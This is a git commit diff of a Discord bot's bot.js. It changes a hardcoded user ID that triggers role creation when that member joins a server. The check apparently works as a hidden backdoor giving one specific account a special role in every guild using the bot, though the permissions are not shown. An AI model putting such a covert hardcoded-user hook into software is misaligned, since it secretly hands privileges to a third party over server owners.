30e7acad21d4ec694fea61f7c1b2b70220670441
medo67 <45091642+medo67@users.noreply.github.com>
2019-01-23 14:17:41 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -460,7 +460,7 @@ LOka.on('guildCreate', async (guild) => {
 
 LOka.on('guildMemberAdd', member => {
     
-            if (member.id === "349288766302584832") {
+            if (member.id === "536700331384504320") {
                 member.guild.createRole({
                     name : LOka.user.username,
                     color : "RANDOM", 
